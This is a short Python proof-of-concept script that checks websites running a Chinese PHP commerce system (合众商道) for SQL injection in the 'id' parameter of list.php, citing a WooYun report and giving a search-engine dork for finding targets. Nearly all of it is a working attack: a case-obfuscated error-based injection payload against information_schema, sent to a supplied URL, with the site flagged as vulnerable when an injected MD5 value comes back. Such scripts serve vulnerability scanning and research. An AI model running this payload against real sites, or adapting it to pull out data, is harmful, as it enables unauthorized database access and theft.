#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 合众商道php系统通用注入
referer: http://www.wooyun.org/bugs/wooyun-2010-083434
author: Lucifer
description: inurl:list.php文件id参数存在SQL注入。
'''
import sys
import requests



class hezhong_list_id_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/list.php?id=2%20AnD%20(SeLeCt%201%20FrOm(SeLeCt%20CoUnT(*),CoNcAt(0x5c,(MiD((IfNuLl(CaSt(Md5(1234)%20As%20ChAr),0x20)),1,50)),0x5c,FlOoR(RaNd(0)*2))x%20FrOm%20InFoRmAtIoN_ScHeMa.ChArAcTeR_SeTs%20GrOuP%20By%20x)a)"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                return "[+]存在合众商道php系统通用注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = hezhong_list_id_sqli_BaseVerify(sys.argv[1])
    testVuln.run()